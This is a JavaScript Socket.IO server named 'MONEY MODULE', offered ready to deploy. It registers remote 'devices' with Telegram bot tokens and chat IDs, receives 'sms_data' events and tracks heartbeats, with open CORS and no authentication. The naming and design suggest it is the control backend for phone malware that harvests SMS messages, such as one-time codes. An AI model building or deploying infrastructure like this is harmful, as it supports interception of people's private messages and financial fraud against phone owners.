/**
 * MONEY MODULE - Socket.IO Server
 * Deploy this on Railway, Render, or any VPS
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling']
});

// Store connected devices
const connectedDevices = new Map();
const registeredDevices = new Map();

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'MONEY MODULE Server Running',
    connectedDevices: connectedDevices.size,
    registeredDevices: registeredDevices.size,
    uptime: process.uptime()
  });
});

// API endpoint to check device
app.get('/api/device/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const device = registeredDevices.get(deviceId);
  
  if (device) {
    res.json({
      success: true,
      device: device
    });
  } else {
    res.json({
      success: false,
      message: 'Device not found'
    });
  }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[CONNECT] New connection: ${socket.id}`);
  
  // Get device info from auth
  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
  const botToken = socket.handshake.auth?.botToken || '';
  const chatId = socket.handshake.auth?.chatId || '';
  
  // Store connection
  connectedDevices.set(socket.id, {
    deviceId,
    botToken,
    chatId,
    connectedAt: new Date().toISOString()
  });
  
  console.log(`[DEVICE] Device connected: ${deviceId}`);
  
  // Send connection confirmation
  socket.emit('connected', {
    message: 'Connected to server',
    deviceId: deviceId,
    socketId: socket.id
  });
  
  // Handle device registration
  socket.on('register', (data) => {
    console.log(`[REGISTER] Device registration: ${JSON.stringify(data)}`);
    
    const regDeviceId = data.deviceId || deviceId;
    
    registeredDevices.set(regDeviceId, {
      deviceId: regDeviceId,
      botToken: data.botToken || botToken,
      chatId: data.chatId || chatId,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    
    socket.emit('registered', {
      success: true,
      message: 'Device registered successfully',
      deviceId: regDeviceId
    });
  });
  
  // Handle SMS data
  socket.on('sms_data', (data) => {
    console.log(`[SMS] Received SMS data from ${deviceId}`);
    
    // Update last seen
    if (registeredDevices.has(deviceId)) {
      const device = registeredDevices.get(deviceId);
      device.lastSeen = new Date().toISOString();
      registeredDevices.set(deviceId, device);
    }
    
    // Acknowledge receipt
    socket.emit('sms_received', {
      success: true,
      message: 'SMS data received'
    });
  });
  
  // Handle heartbeat
  socket.on('heartbeat', () => {
    socket.emit('heartbeat_ack', {
      timestamp: Date.now()
    });
  });
  
  // Handle ping
  socket.on('ping', () => {
    socket.emit('pong', {
      timestamp: Date.now()
    });
  });
  
  // Handle disconnect
  socket.on('disconnect', (reason) => {
    console.log(`[DISCONNECT] ${socket.id} disconnected: ${reason}`);
    connectedDevices.delete(socket.id);
  });
  
  // Handle errors
  socket.on('error', (error) => {
    console.error(`[ERROR] Socket error: ${error}`);
  });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('========================================');
  console.log('🚀 MONEY MODULE Server Started');
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌐 URL: http://localhost:${PORT}`);
  console.log('========================================');
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});
